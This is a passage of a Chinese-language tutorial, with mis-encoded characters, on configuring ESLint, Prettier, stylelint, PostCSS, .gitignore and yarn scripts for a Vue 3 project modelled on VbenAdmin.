\u0026lt;template\u0026gt; of .vue files. We can make mistakes easily on \u0026lt;template\u0026gt; if we use complex directives and expressions in the template. This parser and the rules of eslint-plugin-vue would catch some of the mistakes.\né€™å€‹è§£æå™¨å…è¨±æˆ‘å€‘å°.vueæ–‡ä»¶çš„\u0026lt;template\u0026gt;é€²è¡Œæª¢æŸ¥ã€‚å¦‚æœæˆ‘å€‘åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨äº†è¤‡é›œçš„æŒ‡ä»¤å’Œè¡¨é”å¼ï¼Œæˆ‘å€‘å¾ˆå®¹æ˜“åœ¨\u0026lt;template\u0026gt;ä¸Šå‡ºéŒ¯ã€‚é€™å€‹è§£æå™¨å’Œeslint-plugin-vueçš„è¦å‰‡å¯ä»¥ç™¼ç¾ä¸€äº›éŒ¯èª¤ã€‚\nç¸½ä¹‹eslint-plugin-vueå’Œvue-eslint-parseréœ€è¦ä¸€èµ·ä½¿ç”¨ï¼Œè€Œä¸”å®˜ç¶²ä¹Ÿæœ‰æ¨™ç¤ºæ€éº¼æ“ä½œã€‚\nå®‰è£å…©å€‹ npm æ’ä»¶ 1 yarn add eslint-plugin-vue vue-eslint-parser --dev å°‡æ’ä»¶é…ç½®é€²ESLint é…ç½®ESLintï¼šæ ¹ç›®éŒ„ä¸‹ä¿®æ”¹ï¼š.eslintrc.jsæ–‡ä»¶ .eslintrc.js 1 2 3 4 5 6 7 8 9 module.exports = { // ... parser: \u0026#39;vue-eslint-parser\u0026#39;, // ... extends: [ \u0026#39;plugin:vue/vue3-recommended\u0026#39;, ], // ... } å®‰è£ @typescript-eslint èªªæ˜ é€™è£¡åŒç†éœ€è¦å®‰è£ @typescript-eslint/eslint-plugin å’Œ @typescript-eslint/parserã€‚\nTS-ESLintè¦å‰‡ @typescript-eslint/eslint-pluginçš„npmé¦–é  @typescript-eslint/parserçš„npmé¦–é  å®‰è£TSçš„Lint 1 yarn add @typescript-eslint/eslint-plugin @typescript-eslint/parser --dev å°‡æ’ä»¶é…ç½®é€²ESLint é…ç½®ESLintï¼šæ ¹ç›®éŒ„ä¸‹ä¿®æ”¹ï¼š.eslintrc.jsæ–‡ä»¶ .eslintrc.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 module.exports = { // ... parserOptions: { parser: \u0026#34;@typescript-eslint/parser\u0026#34;, ecmaVersion: 2020, sourceType: \u0026#34;module\u0026#34;, jsxPragma: \u0026#34;React\u0026#34;, ecmaFeatures: { jsx: true, tsx: true, }, }, extends: [\u0026#34;plugin:vue/vue3-recommended\u0026#34;, \u0026#34;plugin:@typescript-eslint/recommended\u0026#34;], // ... } å®‰è£ eslint-plugin-prettier èªªæ˜ prettierç”¨ä¾†æ ¼å¼åŒ–ä»£ç¢¼çš„ã€‚ä¸€èˆ¬IDEéƒ½æœ‰prettierçš„æ’ä»¶ï¼Œåœ¨ä¿å­˜çš„æ™‚å€™æ ¼å¼åŒ–ä»£ç¢¼ã€‚é‚£éº¼æˆ‘å€‘eslint-plugin-prettierå°±æ˜¯é€šéJSä¾†åˆ¤æ–·ä»£ç¢¼æ ¼å¼æ˜¯å¦æ­£ç¢ºã€‚ ä¸€èˆ¬é€™å¾ˆå¿…è¦ï¼Œå› ç‚ºä¸åŒçš„ç¨‹åºå“¡æœ‰ä¸åŒçš„IDEï¼Œä¸åŒçš„IDEæœ‰ä¸åŒçš„prettieræ’ä»¶ã€‚ä½†å°æ–¼é …ç›®ä¾†èªªåªæœ‰ä¸€å€‹eslint-plugin-prettierã€‚\nè€Œeslint-plugin-prettieræ’ä»¶ä¾è³´æ–¼prettierä¾è³´ã€‚é‚£éº¼eslint-config-prettieræ’ä»¶åˆæ˜¯å¹¹å˜›çš„ï¼Ÿ\nprettierå’ŒESLintä¹‹é–“æœ‰äº›è¦å‰‡ä¸ä¸€æ¨£ï¼Œå› æ­¤æ˜¯ç”¨æ–¼è§£æ±ºè¡çªå¾—ã€‚eslint-config-prettierå°‡prettierä¸€äº›è¦å‰‡é»˜èªé—œé–‰äº†ã€‚\nä½¿ç”¨ESLint+Prettierä¾†çµ±ä¸€å‰ç«¯ä»£ç¢¼é¢¨æ ¼ prettieré¦–é  prettierçš„npmé¦–é  eslint-plugin-prettierçš„npmé¦–é  eslint-config-prettierçš„npmé¦–é  å®‰è£ 1 yarn add prettier eslint-plugin-prettier eslint-config-prettier --dev é…ç½®prettier prettierçš„é…ç½®é …\næ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼šprettier.config.jsæ–‡ä»¶ prettier.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 module.exports = { printWidth: 100, tabWidth: 2, useTabs: false, semi: true, vueIndentScriptAndStyle: true, singleQuote: true, quoteProps: \u0026#39;as-needed\u0026#39;, bracketSpacing: true, trailingComma: \u0026#39;es5\u0026#39;, jsxBracketSameLine: false, jsxSingleQuote: false, arrowParens: \u0026#39;always\u0026#39;, insertPragma: false, requirePragma: false, proseWrap: \u0026#39;never\u0026#39;, htmlWhitespaceSensitivity: \u0026#39;strict\u0026#39;, endOfLine: \u0026#39;lf\u0026#39;, rangeStart: 0 } é…ç½®prettierå¿½ç•¥æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.prettierignoreæ–‡ä»¶ .prettierignore 1 2 3 4 5 6 7 8 9 /dist/* .local .output.js /node_modules/** **/*.svg **/*.sh /public/* é…ç½®é€²ESLint é…ç½®ESLintï¼šä¿®æ”¹æ ¹ç›®éŒ„ä¸‹ï¼š.eslintrc.jsæ–‡ä»¶ .eslintrc.js 1 2 3 4 5 6 7 8 9 10 module.exports = { // ... extends: [ \u0026#34;plugin:vue/vue3-recommended\u0026#34;, \u0026#34;plugin:@typescript-eslint/recommended\u0026#34;, \u0026#34;prettier\u0026#34;, \u0026#34;plugin:prettier/recommended\u0026#34;, ], // ... } è‡ªå®šç¾©ESLintæª¢æŸ¥è¦å‰‡ èªªæ˜ ESLintæ˜¯ç”¨ä¾†æª¢æŸ¥ä»£ç¢¼çš„ã€‚åˆå®‰è£äº†é‚£éº¼å¤šçš„æ’ä»¶ã€‚ä½†æ˜¯å®˜æ–¹é»˜èªçš„æ–¹æ¡ˆæœ‰æ™‚ä¸ä¸€æ¨£ç¬¦åˆæˆ‘å€‘çš„è¦æ±‚ã€‚æˆ‘å€‘éœ€è¦è‡ªå®šç¾©è‡ªå·±çš„è¦å‰‡ã€‚\nä¿®æ”¹è¦å‰‡ä¸»è¦æ˜¯ä¿®æ”¹æ ¹ç›®éŒ„ä¸‹.eslintrc.jsæ–‡ä»¶çš„ruleså­—æ®µã€‚\nä¿®æ”¹è¦å‰‡ @typescript-eslint/ban-ts-ignore @typescript-eslint/explicit-function-return-type @typescript-eslint/no-explicit-any @typescript-eslint/no-var-requires @typescript-eslint/no-empty-function vue/custom-event-name-casing no-use-before-define @typescript-eslint/no-use-before-define @typescript-eslint/ban-ts-comment @typescript-eslint/ban-types @typescript-eslint/no-non-null-assertion @typescript-eslint/explicit-module-boundary-types @typescript-eslint/no-unused-vars no-unused-vars space-before-function-paren vue/attributes-order vue/one-component-per-file vue/html-closing-bracket-newline vue/max-attributes-per-line vue/multiline-html-element-content-newline singleline-html-element-content-newline vue/attribute-hyphenation vue/html-self-closing vue/require-default-prop é…ç½®ESLintï¼šæ ¹ç›®éŒ„ä¸‹ï¼š.eslintrc.jsæ–‡ä»¶ .eslintrc.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 module.exports = { // ... rules: { // â†“ ç¦æ­¢ä½¿ç”¨@ts-ignoreä¾†æ¶ˆé™¤ESLintæª¢æŸ¥ \u0026#39;@typescript-eslint/ban-ts-ignore\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨å‡½æ•¸å’Œé¡æ–¹æ³•ä¸Šéœ€è¦é¡¯å¼çš„è¿”å›é¡å‹ \u0026#39;@typescript-eslint/explicit-function-return-type\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢ä½¿ç”¨anyé¡å‹ \u0026#39;@typescript-eslint/no-explicit-any\u0026#39;: \u0026#39;off\u0026#39;, // â†“ é™¤å°å…¥èªå¥å¤–ï¼Œç¦æ­¢ä½¿ç”¨requireèªå¥ \u0026#39;@typescript-eslint/no-var-requires\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢ä½¿ç”¨ç©ºå‡½æ•¸ \u0026#39;@typescript-eslint/no-empty-function\u0026#39;: \u0026#39;off\u0026#39;, // â†“ å°è‡ªå®šç¾©äº‹ä»¶åç¨±å¼·åˆ¶ä½¿ç”¨ç‰¹å®šçš„å¤§å°å¯« \u0026#39;vue/custom-event-name-casing\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢å®šç¾©å‰ä½¿ç”¨ \u0026#39;no-use-before-define\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨å®šç¾©è®Šé‡ä¹‹å‰ä¸å…è¨±ä½¿ç”¨è®Šé‡ \u0026#39;@typescript-eslint/no-use-before-define\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢ä½¿ç”¨@ts-è¨»è§£ \u0026#39;@typescript-eslint/ban-ts-comment\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢ä½¿ç”¨ç‰¹å®šé¡å‹ \u0026#39;@typescript-eslint/ban-types\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢ä½¿ç”¨!å¾Œç¶´é‹ç®—ç¬¦é€²è¡Œénullæ–·è¨€ \u0026#39;@typescript-eslint/no-non-null-assertion\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨å°å‡ºçš„å‡½æ•¸å’Œé¡çš„å…¬å…±é¡æ–¹æ³•ä¸Šéœ€è¦é¡¯å¼çš„è¿”å›å€¼å’Œåƒæ•¸é¡å‹ \u0026#39;@typescript-eslint/explicit-module-boundary-types\u0026#39;: \u0026#39;off\u0026#39;, // â†“ ç¦æ­¢ä½¿ç”¨æœªä½¿ç”¨çš„è®Šé‡ \u0026#39;@typescript-eslint/no-unused-vars\u0026#39;: [ \u0026#39;error\u0026#39;, { argsIgnorePattern: \u0026#39;^h$\u0026#39;, varsIgnorePattern: \u0026#39;^h$\u0026#39;, }, ], // â†“ ç¦æ­¢ä½¿ç”¨æœªä½¿ç”¨çš„è®Šé‡ \u0026#39;no-unused-vars\u0026#39;: [ \u0026#39;error\u0026#39;, { argsIgnorePattern: \u0026#39;^h$\u0026#39;, varsIgnorePattern: \u0026#39;^h$\u0026#39;, }, ], // â†“ åœ¨å‡½æ•¸æ‹¬è™Ÿå‰éœ€è¦æˆ–ä¸å…è¨±æœ‰ç©ºæ ¼ \u0026#39;space-before-function-paren\u0026#39;: \u0026#39;off\u0026#39;, // â†“ å¼·åˆ¶å±¬æ€§é †åº \u0026#39;vue/attributes-order\u0026#39;: \u0026#39;off\u0026#39;, // â†“ å¼·åˆ¶æ¯å€‹çµ„ä»¶æ‡‰ä½æ–¼å…¶è‡ªå·±çš„æ–‡ä»¶ä¸­ \u0026#39;vue/one-component-per-file\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨æ¨™ç±¤çš„å³æ‹¬è™Ÿä¹‹å‰è¦æ±‚æˆ–ä¸å…è¨±æ›è¡Œ \u0026#39;vue/html-closing-bracket-newline\u0026#39;: \u0026#39;off\u0026#39;, // â†“ å¼·åˆ¶æ¯è¡Œçš„æœ€å¤§å±¬æ€§æ•¸ \u0026#39;vue/max-attributes-per-line\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨å¤šè¡Œå…ƒç´ çš„å…§å®¹ä¹‹å‰å’Œä¹‹å¾Œéœ€è¦æ›è¡Œ \u0026#39;vue/multiline-html-element-content-newline\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨å–®è¡Œå…ƒç´ çš„å…§å®¹ä¹‹å‰å’Œä¹‹å¾Œéœ€è¦æ›è¡Œ \u0026#39;vue/singleline-html-element-content-newline\u0026#39;: \u0026#39;off\u0026#39;, // â†“ åœ¨æ¨¡æ¿ä¸­çš„è‡ªå®šç¾©çµ„ä»¶ä¸Šå¯¦æ–½å±¬æ€§å‘½åæ¨£å¼ \u0026#39;vue/attribute-hyphenation\u0026#39;: \u0026#39;off\u0026#39;, // â†“ éœ€è¦é“å…·çš„é»˜èªå€¼ \u0026#39;vue/require-default-prop\u0026#39;: \u0026#39;off\u0026#39;, // â†“ å¯¦æ–½è‡ªæˆ‘å°é–‰çš„é¢¨æ ¼ // \u0026#39;vue/html-self-closing\u0026#39;: \u0026#39;off\u0026#39;, \u0026#39;vue/html-self-closing\u0026#39;: [ \u0026#39;error\u0026#39;, { html: { void: \u0026#39;always\u0026#39;, normal: \u0026#39;never\u0026#39;, component: \u0026#39;always\u0026#39;, }, svg: \u0026#39;always\u0026#39;, math: \u0026#39;always\u0026#39; } ] } } vbené …ç›®é…ç½®gitå¿½ç•¥æ–‡ä»¶ èªªæ˜ é€™å€‹æ‡‰è©²æ˜¯é …ç›®ä¸€ä¸Šä¾†å°±è¦è™•ç†çš„ï¼Œä½†æ˜¯æˆ‘æ‰‹æ’•Vbençš„æ™‚å€™ï¼ŒæŒ‰ç…§é…ç½®æ–‡ä»¶çš„é †åºä¸‹ä¾†ï¼Œåˆ°ç¾åœ¨æ‰è™•ç†äº†ã€‚\nå‰µå»ºGitå¿½ç•¥æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.gitignoreæ–‡ä»¶ .gitignore 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 node_modules .DS_Store dist dist-ssr *.local # other .npmrc .cache test/upload-server/static .local # local env files .env.local .env.*.local # Log files npm-debug.log* yarn-debug.log* yarn-error.log* pnpm-debug.log* # Editor directories and files .idea # .vscode *.suo *.ntvs* *.njsproj *.sln *.sw? å®‰è£style-lint èªªæ˜ é€™æ¬¡éœ€è¦å®‰è£å››å€‹æ’ä»¶stylelintã€stylelint-config-standardã€stylelint-config-prettierã€stylelint-orderã€‚\nstylelintæ˜¯å°æˆ‘å€‘ç·¨å¯«çš„æ¨£å¼é€²è¡Œæª¢æŸ¥çš„æ’ä»¶ã€‚ stylelint-config-standardæ˜¯stylelintæ“´å±•çš„æª¢æŸ¥æ¨™æº–åº«ã€‚ stylelint-config-prettieræ˜¯ç”¨ä¾†è§£æ±ºè¡çªçš„ï¼ˆä¼°è¨ˆåˆå’ŒESLintè¡çªäº†ï¼Œåƒè€ƒä¹‹å‰çš„prettierï¼‰ã€‚ stylelint-orderæ˜¯æª¢æŸ¥æˆ‘å€‘æ¨£å¼ç·¨å¯«é †åºçš„ã€‚ åƒè€ƒé€£çµ stylelintå®˜ç¶² stylelintçš„npmé¦–é  stylelint-config-standardçš„npmé¦–é ï¼šæ“´å±•ï¼Œæ¨™æº–åº« stylelint-config-prettierçš„npmé¦–é ï¼šæ“´å±•ï¼Œè§£æ±ºè¡çªçš„ stylelint-orderçš„npmé¦–é ï¼šæ’ä»¶ï¼Œæ¨£å¼æ’åº stylelinitçš„é…ç½®èªªæ˜ stylelintçš„é…ç½®è¦å‰‡ å®‰è£ 1 yarn add stylelint stylelint-config-standard stylelint-config-prettier stylelint-order --dev é…ç½®stylelint æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼šstylelint.config.jsæ–‡ä»¶ stylelint.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 module.exports = { // â†“ é€™å€‹å¥½åƒæ˜¯æ²’æœ‰ç”¨çš„ï¼Œä½†æ˜¯VbenAdminæ˜¯é€™éº¼å¯«çš„ root: true, // â†“ æ’ä»¶ plugins: [\u0026#39;stylelint-order\u0026#39;], // â†“ æ“´å±• extends: [\u0026#39;stylelint-config-standard\u0026#39;, \u0026#39;stylelint-config-prettier\u0026#39;], // â†“ è‡ªå®šç¾©è¦å‰‡ rules: {}, // â†“ å¿½ç•¥æª¢æŸ¥çš„æ–‡ä»¶ ignoreFiles: [\u0026#39;**/*.js\u0026#39;, \u0026#39;**/*.jsx\u0026#39;, \u0026#39;**/*.tsx\u0026#39;, \u0026#39;**/*.ts\u0026#39;] } é…ç½®è‡ªå®šç¾©æ¨£å¼è¦å‰‡ æ ¹ç›®éŒ„ä¸‹ä¿®æ”¹ï¼šstylelint.config.jsæ–‡ä»¶ stylelint.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 module.exports = { // ... rules: { // â†“ ç¦æ­¢ä½¿ç”¨æœªçŸ¥çš„å½é¡é¸æ“‡å™¨ã€‚ \u0026#39;selector-pseudo-class-no-unknown\u0026#39;: [ true, { ignorePseudoClasses: [\u0026#39;global\u0026#39;] } ], // â†“ ç¦æ­¢ä½¿ç”¨æœªçŸ¥è¦å‰‡ã€‚ \u0026#39;at-rule-no-unknown\u0026#39;: [ true, { ignoreAtRules: [\u0026#39;function\u0026#39;, \u0026#39;if\u0026#39;, \u0026#39;each\u0026#39;, \u0026#39;include\u0026#39;, \u0026#39;mixin\u0026#39;] } ], // â†“ ç¦æ­¢ç©ºä¾†æºã€‚ \u0026#39;no-empty-source\u0026#39;: null, // â†“ ç¦æ­¢ä½¿ç”¨ç„¡æ•ˆçš„å‘½åç¶²æ ¼å€åŸŸã€‚ \u0026#39;named-grid-areas-no-invalid\u0026#39;: null, // â†“ è¦æ±‚æˆ–ä¸å…è¨±ä½¿ç”¨Unicodeå­—ç¯€é †åºæ¨™è¨˜ã€‚ \u0026#39;unicode-bom\u0026#39;: \u0026#39;never\u0026#39;, // â†“ ç¦æ­¢è¼ƒä½ç‰¹ç•°æ€§çš„é¸æ“‡å™¨åœ¨è¦†è“‹è¼ƒé«˜ç‰¹ç•°æ€§çš„é¸æ“‡å™¨ä¹‹å¾Œå‡ºç¾ã€‚ \u0026#39;no-descending-specificity\u0026#39;: null, // â†“ ç¦æ­¢åœ¨å­—é«”ç³»åˆ—åç¨±åˆ—è¡¨ä¸­ç¼ºå°‘é€šç”¨ç³»åˆ—ã€‚ \u0026#39;font-family-no-missing-generic-family-keyword\u0026#39;: null, // â†“ åœ¨è²æ˜çš„å†’è™Ÿå¾Œé¢éœ€è¦ä¸€å€‹ç©ºæ ¼æˆ–ç¦æ­¢ç©ºæ ¼ã€‚ \u0026#39;declaration-colon-space-after\u0026#39;: \u0026#39;always-single-line\u0026#39;, // â†“ åœ¨è²æ˜çš„å†’è™Ÿä¹‹å‰éœ€è¦ä¸€å€‹ç©ºæ ¼æˆ–ç¦æ­¢ä½¿ç”¨ç©ºæ ¼ã€‚ \u0026#39;declaration-colon-space-before\u0026#39;: \u0026#39;never\u0026#39;, // â†“ åœ¨è²æ˜å¡Šå…§è¦æ±‚æˆ–ä¸å…è¨±å°¾éš¨åˆ†è™Ÿã€‚ \u0026#39;declaration-block-trailing-semicolon\u0026#39;: \u0026#39;always\u0026#39;, // â†“ åœ¨è¦å‰‡ä¹‹å‰è¦æ±‚æˆ–ç¦æ­¢ä½¿ç”¨ç©ºè¡Œã€‚ \u0026#39;rule-empty-line-before\u0026#39;: [ \u0026#39;always\u0026#39;, { ignore: [\u0026#39;after-comment\u0026#39;, \u0026#39;first-nested\u0026#39;], } ], // â†“ ç¦æ­¢ä½¿ç”¨æœªçŸ¥å–®ä½ã€‚ \u0026#39;unit-no-unknown\u0026#39;: [true, { ignoreUnits: [\u0026#39;rpx\u0026#39;] }], // Specify the alphabetical order of the attributes in the declaration block // â†“ æ¨£å¼é †åº \u0026#39;order/properties-order\u0026#39;: [ \u0026#39;position\u0026#39;, \u0026#39;top\u0026#39;, \u0026#39;right\u0026#39;, \u0026#39;bottom\u0026#39;, \u0026#39;left\u0026#39;, \u0026#39;z-index\u0026#39;, \u0026#39;display\u0026#39;, \u0026#39;float\u0026#39;, \u0026#39;width\u0026#39;, \u0026#39;height\u0026#39;, \u0026#39;max-width\u0026#39;, \u0026#39;max-height\u0026#39;, \u0026#39;min-width\u0026#39;, \u0026#39;min-height\u0026#39;, \u0026#39;padding\u0026#39;, \u0026#39;padding-top\u0026#39;, \u0026#39;padding-right\u0026#39;, \u0026#39;padding-bottom\u0026#39;, \u0026#39;padding-left\u0026#39;, \u0026#39;margin\u0026#39;, \u0026#39;margin-top\u0026#39;, \u0026#39;margin-right\u0026#39;, \u0026#39;margin-bottom\u0026#39;, \u0026#39;margin-left\u0026#39;, \u0026#39;margin-collapse\u0026#39;, \u0026#39;margin-top-collapse\u0026#39;, \u0026#39;margin-right-collapse\u0026#39;, \u0026#39;margin-bottom-collapse\u0026#39;, \u0026#39;margin-left-collapse\u0026#39;, \u0026#39;overflow\u0026#39;, \u0026#39;overflow-x\u0026#39;, \u0026#39;overflow-y\u0026#39;, \u0026#39;clip\u0026#39;, \u0026#39;clear\u0026#39;, \u0026#39;font\u0026#39;, \u0026#39;font-family\u0026#39;, \u0026#39;font-size\u0026#39;, \u0026#39;font-smoothing\u0026#39;, \u0026#39;osx-font-smoothing\u0026#39;, \u0026#39;font-style\u0026#39;, \u0026#39;font-weight\u0026#39;, \u0026#39;hyphens\u0026#39;, \u0026#39;src\u0026#39;, \u0026#39;line-height\u0026#39;, \u0026#39;letter-spacing\u0026#39;, \u0026#39;word-spacing\u0026#39;, \u0026#39;color\u0026#39;, \u0026#39;text-align\u0026#39;, \u0026#39;text-decoration\u0026#39;, \u0026#39;text-indent\u0026#39;, \u0026#39;text-overflow\u0026#39;, \u0026#39;text-rendering\u0026#39;, \u0026#39;text-size-adjust\u0026#39;, \u0026#39;text-shadow\u0026#39;, \u0026#39;text-transform\u0026#39;, \u0026#39;word-break\u0026#39;, \u0026#39;word-wrap\u0026#39;, \u0026#39;white-space\u0026#39;, \u0026#39;vertical-align\u0026#39;, \u0026#39;list-style\u0026#39;, \u0026#39;list-style-type\u0026#39;, \u0026#39;list-style-position\u0026#39;, \u0026#39;list-style-image\u0026#39;, \u0026#39;pointer-events\u0026#39;, \u0026#39;cursor\u0026#39;, \u0026#39;background\u0026#39;, \u0026#39;background-attachment\u0026#39;, \u0026#39;background-color\u0026#39;, \u0026#39;background-image\u0026#39;, \u0026#39;background-position\u0026#39;, \u0026#39;background-repeat\u0026#39;, \u0026#39;background-size\u0026#39;, \u0026#39;border\u0026#39;, \u0026#39;border-collapse\u0026#39;, \u0026#39;border-top\u0026#39;, \u0026#39;border-right\u0026#39;, \u0026#39;border-bottom\u0026#39;, \u0026#39;border-left\u0026#39;, \u0026#39;border-color\u0026#39;, \u0026#39;border-image\u0026#39;, \u0026#39;border-top-color\u0026#39;, \u0026#39;border-right-color\u0026#39;, \u0026#39;border-bottom-color\u0026#39;, \u0026#39;border-left-color\u0026#39;, \u0026#39;border-spacing\u0026#39;, \u0026#39;border-style\u0026#39;, \u0026#39;border-top-style\u0026#39;, \u0026#39;border-right-style\u0026#39;, \u0026#39;border-bottom-style\u0026#39;, \u0026#39;border-left-style\u0026#39;, \u0026#39;border-width\u0026#39;, \u0026#39;border-top-width\u0026#39;, \u0026#39;border-right-width\u0026#39;, \u0026#39;border-bottom-width\u0026#39;, \u0026#39;border-left-width\u0026#39;, \u0026#39;border-radius\u0026#39;, \u0026#39;border-top-right-radius\u0026#39;, \u0026#39;border-bottom-right-radius\u0026#39;, \u0026#39;border-bottom-left-radius\u0026#39;, \u0026#39;border-top-left-radius\u0026#39;, \u0026#39;border-radius-topright\u0026#39;, \u0026#39;border-radius-bottomright\u0026#39;, \u0026#39;border-radius-bottomleft\u0026#39;, \u0026#39;border-radius-topleft\u0026#39;, \u0026#39;content\u0026#39;, \u0026#39;quotes\u0026#39;, \u0026#39;outline\u0026#39;, \u0026#39;outline-offset\u0026#39;, \u0026#39;opacity\u0026#39;, \u0026#39;filter\u0026#39;, \u0026#39;visibility\u0026#39;, \u0026#39;size\u0026#39;, \u0026#39;zoom\u0026#39;, \u0026#39;transform\u0026#39;, \u0026#39;box-align\u0026#39;, \u0026#39;box-flex\u0026#39;, \u0026#39;box-orient\u0026#39;, \u0026#39;box-pack\u0026#39;, \u0026#39;box-shadow\u0026#39;, \u0026#39;box-sizing\u0026#39;, \u0026#39;table-layout\u0026#39;, \u0026#39;animation\u0026#39;, \u0026#39;animation-delay\u0026#39;, \u0026#39;animation-duration\u0026#39;, \u0026#39;animation-iteration-count\u0026#39;, \u0026#39;animation-name\u0026#39;, \u0026#39;animation-play-state\u0026#39;, \u0026#39;animation-timing-function\u0026#39;, \u0026#39;animation-fill-mode\u0026#39;, \u0026#39;transition\u0026#39;, \u0026#39;transition-delay\u0026#39;, \u0026#39;transition-duration\u0026#39;, \u0026#39;transition-property\u0026#39;, \u0026#39;transition-timing-function\u0026#39;, \u0026#39;background-clip\u0026#39;, \u0026#39;backface-visibility\u0026#39;, \u0026#39;resize\u0026#39;, \u0026#39;appearance\u0026#39;, \u0026#39;user-select\u0026#39;, \u0026#39;interpolation-mode\u0026#39;, \u0026#39;direction\u0026#39;, \u0026#39;marks\u0026#39;, \u0026#39;page\u0026#39;, \u0026#39;set-link-source\u0026#39;, \u0026#39;unicode-bidi\u0026#39;, \u0026#39;speak\u0026#39; ] } // ... } é…ç½®stylelintå¿½ç•¥æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.stylelintignoreæ–‡ä»¶ .stylelintignore 1 2 /dist/* /public/* é…ç½®Yarnè‡ªå‹•æ¸…é™¤åŠŸèƒ½ èªªæ˜ å¯¦ç¾æ¯ä¸€æ¬¡installä¹‹å¾Œã€addä¹‹å¾Œã€yarn autoclean --forceä¹‹å¾Œã€‚å¾ç¨‹åºåŒ…ä¾è³´é …ä¸­æ¸…é™¤ä¸¦åˆªé™¤ä¸å¿…è¦çš„æ–‡ä»¶ã€‚\nåƒè€ƒéˆæ¥ï¼šyarn autoclean-å®˜æ–¹èªªæ˜\nåˆå§‹åŒ– 1 yarn autoclean --init åŸ·è¡Œå®Œå‘½ä»¤ä¹‹å¾Œï¼ŒYarnå°±æœƒè‡ªå‹•åœ¨æ ¹ç›®éŒ„ä¸‹å‰µå»ºä¸€å€‹.yarncleanæ–‡ä»¶ï¼Œé€™æ¨£å°±å¯ä»¥äº†ã€‚\nå®‰è£PostCSS èªªæ˜ æˆ‘å€‘éœ€è¦å®‰è£å…©å€‹åº«postcssã€autoprefixerã€‚è¦ç¾å¯¦çš„æ•ˆæœå°±æ˜¯æˆ‘å€‘ç·¨å¯«ä¸€èˆ¬çš„æ¨£å¼ï¼Œæ¸²æŸ“é é¢çš„domç¯€é»æœ‰é¢å‘å„ç¨®ç€è¦½å™¨å» å•†çš„æ¨£å¼ã€‚\nç¶²ä¸Šèªªpostcssé¡ä¼¼ä¸€å€‹å¹³å°ï¼Œä¸Šé¢æœ‰å¾ˆå¤šæ’ä»¶ï¼Œautoprefixerå°±å…¶ä¸­ä¸€å€‹ã€‚\næˆ‘ä»¥æˆ‘çš„çœ‹æ³•ä¾†è§£é‡‹ä¸€ä¸‹ï¼špostcsså°±åƒä¸€å€‹ç®¡å­ï¼Œautoprefixeræ˜¯è£¡é¢çš„éæ¿¾å™¨ã€‚ä½ å¯«çš„csså¾ç®¡å­ä¸­æµéï¼Œç¶“éä»–å€‘çš„è™•ç†å°±å‡ºç¾äº†ä¸åŒçš„çµæœã€‚\nåƒè€ƒé€£çµï¼š\nViteé…ç½®PostCss postcssçš„å®˜ç¶² postcssçš„npmé¦–é  autoprefixerçš„npmé¦–é  çŸ¥ä¹autoprefixerèªªæ˜ å®‰è£ 1 yarn add postcss autoprefixer --dev é…ç½®postcss æ ¹ç›®éŒ„ä¸‹ï¼špostcss.config.js postcss.config.js 1 2 3 4 5 module.exports = { plugins: { autoprefixer: {} } } è§£æVbenAdminä¸­çš„script èªªæ˜ VbenAdminå®˜æ–¹æ–‡æª”-npm Script\nä¸€ä¸‹è…³æœ¬ç›´æ¥æ·»åŠ åœ¨æ ¹ç›®éŒ„ä¸‹çš„package.jsonçš„scriptså°è±¡ä¸­å³å¯ã€‚ä¹Ÿå¯ä»¥ç›´æ¥ç…§æ¬VbenAdminçš„ã€‚\nä»¥bootstrapç‚ºä¾‹ã€‚å¦‚ä¸‹ï¼š\n1 2 3 yarn bootstrap # or # npm run bootstrap bootstrap ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;bootstrap\u0026#34;: \u0026#34;yarn install\u0026#34;, // ... } ä½œç”¨ï¼šä½¿ç”¨yarnå®‰è£æ‰€æœ‰ä¾è³´ã€‚\nserve 